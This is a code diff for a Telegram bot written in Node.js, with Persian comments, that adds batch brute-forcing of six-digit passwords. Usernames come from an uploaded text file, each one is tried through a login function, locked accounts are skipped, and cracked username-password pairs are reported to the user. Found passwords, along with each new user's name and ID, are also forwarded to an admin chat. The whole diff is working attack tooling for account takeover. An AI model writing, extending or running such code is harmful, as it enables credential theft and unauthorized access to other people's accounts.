@@ -25,8 +25,12 @@ const app = express();
 const runningTasks = new Map();
 
 let publicAccessEnabled = false;
-const authorizedUsers = new Set();
+// ✅ تغییر از Set به Map برای ذخیره نام کاربران
+const authorizedUsers = new Map();
 const usedUsers = new Set();
+
+// ✅ اضافه شده برای batch
+const batchTasks = new Map();
 
 let dailyLog = {
   date: new Date().toISOString().split("T")[0],
@@ -360,6 +364,19 @@ async function checkIfStillLocked(username) {
   return result.isLocked || false;
 }
 
+async function getUserInfo(userId) {
+  try {
+    const chat = await bot.getChat(userId);
+    return {
+      firstName: chat.first_name || "Unknown",
+      lastName: chat.last_name || "",
+      username: chat.username || "no_username",
+    };
+  } catch (error) {
+    return { firstName: "Unknown", lastName: "", username: "no_username" };
+  }
+}
+
 async function bruteForceUsername(username, chatId) {
   if (runningTasks.has(username) && runningTasks.get(username).isRunning) {
     await bot.sendMessage(
@@ -580,6 +597,140 @@ async function bruteForceUsername(username, chatId) {
   }
 
   runningTasks.delete(username);
+}
+
+async function bruteForceForBatch(username, chatId) {
+  const task = {
+    isRunning: true,
+    username: username,
+    chatId: chatId,
+    processedCount: 0,
+    currentPassword: "000000",
+    startTime: Date.now(),
+  };
+
+  runningTasks.set(username, task);
+
+  for (let i = START; i <= END; i++) {
+    if (!runningTasks.has(username) || !runningTasks.get(username).isRunning) {
+      runningTasks.delete(username);
+      return { status: "stopped", username };
+    }
+
+    const batchId = chatId.toString();
+    if (batchTasks.has(batchId) && !batchTasks.get(batchId).isRunning) {
+      runningTasks.delete(username);
+      return { status: "batch_stopped", username };
+    }
+
+    const password = i.toString().padStart(6, "0");
+    task.currentPassword = password;
+
+    const result = await tryLogin(username, password);
+    task.processedCount++;
+
+    if (result.isError) {
+      runningTasks.delete(username);
+      return { status: "error", username };
+    }
+
+    if (result.isLocked) {
+      await bot.sendMessage(
+        chatId,
+        `🔒 *Locked - Skipping!*\n\n👤 \`${username}\`\n🔑 Last: \`${password}\`\n📊 Tested: ${task.processedCount}`,
+        { parse_mode: "Markdown" }
+      );
+      runningTasks.delete(username);
+      return { status: "locked", username, tested: task.processedCount };
+    }
+
+    if (result.success) {
+      const msg = `🎉 *PASSWORD FOUND!*\n\n👤 \`${username}\`\n🔑 \`${password}\``;
+      await bot.sendMessage(chatId, msg, { parse_mode: "Markdown" });
+
+      dailyLog.successfulLogins.push({
+        username,
+        password,
+        userId: chatId,
+        time: new Date().toISOString(),
+      });
+
+      if (chatId.toString() !== ADMIN_CHAT_ID) {
+        await sendTelegram(msg + `\n\n🆔 User: \`${chatId}\``);
+      }
+
+      runningTasks.delete(username);
+      return { status: "found", username, password };
+    }
+
+    await sleep(BATCH_DELAY);
+  }
+
+  await bot.sendMessage(chatId, `❌ *Not Found:* \`${username}\``, {
+    parse_mode: "Markdown",
+  });
+  runningTasks.delete(username);
+  return { status: "not_found", username };
+}
+
+async function processBatchUsernames(usernames, chatId) {
+  const batchId = chatId.toString();
+  const batch = {
+    usernames,
+    currentIndex: 0,
+    isRunning: true,
+    startTime: Date.now(),
+    found: [],
+    locked: [],
+    notFound: [],
+  };
+
+  batchTasks.set(batchId, batch);
+
+  await bot.sendMessage(
+    chatId,
+    `📦 *Batch Started!*\n\n📊 Total: ${usernames.length}\n\n🔒 Locked = Skip\n🎉 Found = Notify & Next\n\n/stopall to stop`,
+    { parse_mode: "Markdown" }
+  );
+
+  for (let i = 0; i < usernames.length; i++) {
+    if (!batchTasks.has(batchId) || !batchTasks.get(batchId).isRunning) break;
+
+    const username = usernames[i].trim();
+    if (!username) continue;
+
+    batch.currentIndex = i;
+
+    await bot.sendMessage(
+      chatId,
+      `📦 *${i + 1}/${usernames.length}*\n👤 \`${username}\``,
+      { parse_mode: "Markdown" }
+    );
+
+    const result = await bruteForceForBatch(username, chatId);
+
+    if (result.status === "found") batch.found.push(result);
+    else if (result.status === "locked") batch.locked.push(result);
+    else if (result.status === "not_found") batch.notFound.push(result);
+    else if (result.status === "batch_stopped") break;
+  }
+
+  const time = ((Date.now() - batch.startTime) / 1000 / 60).toFixed(2);
+
+  let report = `🎉 *Batch Done!*\n\n📊 Total: ${usernames.length}\n⏱️ Time: ${time}m\n\n`;
+  report += `🎉 Found: ${batch.found.length}\n🔒 Locked: ${batch.locked.length}\n❌ Not Found: ${batch.notFound.length}\n\n`;
+
+  if (batch.found.length > 0) {
+    report += `🔑 *Passwords:*\n`;
+    batch.found.forEach((f, i) => {
+      report += `${i + 1}. \`${f.username}\` : \`${f.password}\`\n`;
+    });
+  }
+
+  await bot.sendMessage(chatId, report, { parse_mode: "Markdown" });
+  if (chatId.toString() !== ADMIN_CHAT_ID) await sendTelegram(report);
+
+  batchTasks.delete(batchId);
 }
 
 app.use(express.json());
@@ -816,6 +967,21 @@ bot.onText(/\/start/, async (msg) => {
   const chatId = msg.chat.id;
   const access = hasAccess(chatId);
 
+  if (chatId.toString() !== ADMIN_CHAT_ID) {
+    await sendTelegram(
+      `🚀 *New User Started Bot!*\n\n` +
+        `🆔 User ID: \`${chatId}\`\n` +
+        `👤 Name: ${msg.from.first_name || "Unknown"} ${
+          msg.from.last_name || ""
+        }\n` +
+        `📝 Username: ${
+          msg.from.username ? "@" + msg.from.username : "None"
+        }\n` +
+        `✅ Access: ${access.allowed ? "Yes" : "No"}\n` +
+        `${!access.allowed ? `\n💡 Grant: \`/access ${chatId}\`` : ""}`
+    );
+  }
+
   if (!access.allowed) {
     let errorMsg = "⛔ You don't have access to this bot!\n\n";
 
@@ -836,16 +1002,6 @@ bot.onText(/\/start/, async (msg) => {
         username: msg.from.username || "no_username",
         time: new Date().toISOString(),
       });
-
-      await sendTelegram(
-        `🔔 *New Access Request*\n\n` +
-          `🆔 User ID: \`${chatId}\`\n` +
-          `👤 Name: ${msg.from.first_name || "Unknown"}\n` +
-          `📝 Username: ${
-            msg.from.username ? "@" + msg.from.username : "None"
-          }\n\n` +
-          `💡 To grant access:\n\`/access ${chatId}\``
-      );
     }
 
     return;
@@ -861,6 +1017,11 @@ bot.onText(/\/start/, async (msg) => {
 /list - View last 10 tests for running tasks
 /status - Overall status
 /help - Help guide
+
+📦 *Batch Commands:*
+/addall - Reply to .txt file with /addall
+/stopall - Stop all tests
+/batchstatus - Batch progress
 
 *Example:*
 \`/add 0123456789\`
@@ -938,6 +1099,105 @@ bot.onText(/\/add (.+)/, async (msg, match) => {
   });
 });
 
+bot.onText(/\/addall/, async (msg) => {
+  const chatId = msg.chat.id;
+  const access = hasAccess(chatId);
+
+  if (!access.isAdmin) {
+    bot.sendMessage(chatId, "⛔ Admin only!");
+    return;
+  }
+
+  if (!msg.reply_to_message || !msg.reply_to_message.document) {
+    bot.sendMessage(
+      chatId,
+      `❌ *Reply to a .txt file!*\n\n1. Send .txt file\n2. Reply with /addall`,
+      { parse_mode: "Markdown" }
+    );
+    return;
+  }
+
+  const doc = msg.reply_to_message.document;
+  if (!doc.file_name.endsWith(".txt")) {
+    bot.sendMessage(chatId, "❌ Only .txt files!");
+    return;
+  }
+
+  try {
+    const fileLink = await bot.getFileLink(doc.file_id);
+    const response = await axios.get(fileLink, { responseType: "text" });
+    const usernames = response.data
+      .split("\n")
+      .map((l) => l.trim())
+      .filter((l) => l.length > 0);
+
+    if (usernames.length === 0) {
+      bot.sendMessage(chatId, "❌ File is empty!");
+      return;
+    }
+
+    if (batchTasks.has(chatId.toString())) {
+      bot.sendMessage(chatId, "⚠️ Batch already running! Use /stopall first.");
+      return;
+    }
+
+    processBatchUsernames(usernames, chatId);
+  } catch (error) {
+    bot.sendMessage(chatId, `❌ Error: ${error.message}`);
+  }
+});
+
+// ✅ دستور جدید /stopall
+bot.onText(/\/stopall/, async (msg) => {
+  const chatId = msg.chat.id;
+  const access = hasAccess(chatId);
+
+  if (!access.isAdmin) {
+    bot.sendMessage(chatId, "⛔ Admin only!");
+    return;
+  }
+
+  let count = 0;
+  batchTasks.forEach((b) => {
+    b.isRunning = false;
+    count++;
+  });
+  runningTasks.forEach((t) => {
+    t.isRunning = false;
+    count++;
+  });
+
+  bot.sendMessage(chatId, `🛑 Stopping ${count} tasks...`, {
+    parse_mode: "Markdown",
+  });
+});
+
+bot.onText(/\/batchstatus/, async (msg) => {
+  const chatId = msg.chat.id;
+  const batchId = chatId.toString();
+
+  if (!batchTasks.has(batchId)) {
+    bot.sendMessage(chatId, "💤 No batch running.");
+    return;
+  }
+
+  const batch = batchTasks.get(batchId);
+  const progress = (
+    ((batch.currentIndex + 1) / batch.usernames.length) *
+    100
+  ).toFixed(1);
+
+  bot.sendMessage(
+    chatId,
+    `📦 *Batch Status*\n\n` +
+      `📊 ${batch.currentIndex + 1}/${
+        batch.usernames.length
+      } (${progress}%)\n` +
+      `🎉 Found: ${batch.found.length}\n🔒 Locked: ${batch.locked.length}`,
+    { parse_mode: "Markdown" }
+  );
+});
+
 bot.onText(/\/stop (.+)/, async (msg, match) => {
   const chatId = msg.chat.id;
   const access = hasAccess(chatId);
@@ -1010,11 +1270,11 @@ bot.onText(/\/list/, async (msg) => {
       message += `👤 \`${username}\`\n`;
       message += `   🔑 Current: \`${task.currentPassword}\`\n`;
       message += `   📊 Progress: ${progress}%\n`;
-      message += `   ✅ Success: ${task.successCount}\n`;
-      message += `   🔒 Locked: ${task.lockedCount}\n`;
+      message += `   ✅ Success: ${task.successCount || 0}\n`;
+      message += `   🔒 Locked: ${task.lockedCount || 0}\n`;
       message += `   ⏱️ Time: ${elapsed}m\n`;
 
-      if (task.lastTests.length > 0) {
+      if (task.lastTests && task.lastTests.length > 0) {
         message += `\n   📝 *Last 10 Tests:*\n`;
         const last10 = task.lastTests.slice(-10);
         last10.forEach((test) => {
@@ -1050,8 +1310,8 @@ bot.onText(/\/status/, async (msg) => {
   let myTasks = 0;
 
   runningTasks.forEach((task) => {
-    totalSuccess += task.successCount;
-    totalProcessed += task.processedCount;
+    totalSuccess += task.successCount || 0;
+    totalProcessed += task.processedCount || 0;
 
     if (task.chatId && task.chatId.toString() === chatId.toString()) {
       myTasks++;
@@ -1196,7 +1456,14 @@ bot.onText(/\/access (.+)/, async (msg, match) => {
     return;
   }
 
-  authorizedUsers.add(userId);
+  // ✅ دریافت اطلاعات و ذخیره در Map
+  const userInfo = await getUserInfo(userId);
+  authorizedUsers.set(userId, {
+    name:
+      userInfo.firstName + (userInfo.lastName ? " " + userInfo.lastName : ""),
+    username: userInfo.username,
+    addedAt: new Date().toISOString(),
+  });
 
   dailyLog.addedUsers.push({
     userId: userId,
@@ -1207,6 +1474,7 @@ bot.onText(/\/access (.+)/, async (msg, match) => {
     chatId,
     `✅ *Permanent Access Granted!*\n\n` +
       `🆔 User ID: \`${userId}\`\n` +
+      `👤 Name: ${userInfo.firstName}\n` +
       `👥 Total Authorized: ${authorizedUsers.size}\n\n` +
       `💡 User can use the bot unlimited times until revoked.`,
     { parse_mode: "Markdown" }
@@ -1256,6 +1524,7 @@ bot.onText(/\/revoke (.+)/, async (msg, match) => {
     return;
   }
 
+  const userInfo = authorizedUsers.get(userId);
   authorizedUsers.delete(userId);
 
   dailyLog.revokedUsers.push({
@@ -1267,6 +1536,7 @@ bot.onText(/\/revoke (.+)/, async (msg, match) => {
     chatId,
     `✅ *Access Revoked!*\n\n` +
       `🆔 User ID: \`${userId}\`\n` +
+      `👤 Name: ${userInfo?.name || "Unknown"}\n` +
       `👥 Total Authorized: ${authorizedUsers.size}`,
     { parse_mode: "Markdown" }
   );
@@ -1280,6 +1550,7 @@ bot.onText(/\/revoke (.+)/, async (msg, match) => {
   } catch (error) {}
 });
 
+// ✅ دستور /users اصلاح شده با نمایش نام
 bot.onText(/\/users/, async (msg) => {
   const chatId = msg.chat.id;
 
@@ -1296,9 +1567,30 @@ bot.onText(/\/users/, async (msg) => {
 
   if (authorizedUsers.size > 0) {
     message += `✅ *Authorized Users (Permanent):* (${authorizedUsers.size})\n`;
-    authorizedUsers.forEach((userId) => {
-      message += `   ♾️ \`${userId}\`\n`;
-    });
+
+    for (const [userId, userData] of authorizedUsers) {
+      let displayName = userData?.name || "Unknown";
+      let displayUsername = userData?.username || "no_username";
+
+      if (!userData || userData.name === "Unknown") {
+        const freshInfo = await getUserInfo(userId);
+        displayName =
+          freshInfo.firstName +
+          (freshInfo.lastName ? " " + freshInfo.lastName : "");
+        displayUsername = freshInfo.username;
+        authorizedUsers.set(userId, {
+          name: displayName,
+          username: displayUsername,
+          addedAt: new Date().toISOString(),
+        });
+      }
+
+      message += `   ♾️ \`${userId}\` - ${displayName}`;
+      if (displayUsername !== "no_username") {
+        message += ` (@${displayUsername})`;
+      }
+      message += `\n`;
+    }
   } else {
     message += `⚠️ No authorized users\n`;
   }
@@ -1320,11 +1612,17 @@ bot.onText(/\/resetall/, async (msg) => {
     task.isRunning = false;
   });
 
+  batchTasks.forEach((batch) => {
+    batch.isRunning = false;
+  });
+
   const tasksCount = runningTasks.size;
+  const batchCount = batchTasks.size;
   const usersCount = usedUsers.size;
   const authCount = authorizedUsers.size;
 
   runningTasks.clear();
+  batchTasks.clear();
   usedUsers.clear();
   authorizedUsers.clear();
   publicAccessEnabled = false;
@@ -1333,6 +1631,7 @@ bot.onText(/\/resetall/, async (msg) => {
     chatId,
     `🔄 *Full Reset Complete!*\n\n` +
       `✅ ${tasksCount} tests stopped\n` +
+      `✅ ${batchCount} batches stopped\n` +
       `✅ ${usersCount} used public users cleared\n` +
       `✅ ${authCount} authorized users cleared\n` +
       `✅ Public access disabled\n\n` +
@@ -1363,6 +1662,11 @@ Shows current password and last 10 tests
 
 *4️⃣ Overall status:*
 \`/status\`
+
+📦 *Batch Processing:*
+*5️⃣* Send .txt file, reply with /addall
+*6️⃣* /stopall - Stop all
+*7️⃣* /batchstatus - Progress
 
 ⚙️ *Settings:*
 • Password Range: ${START} - ${END}
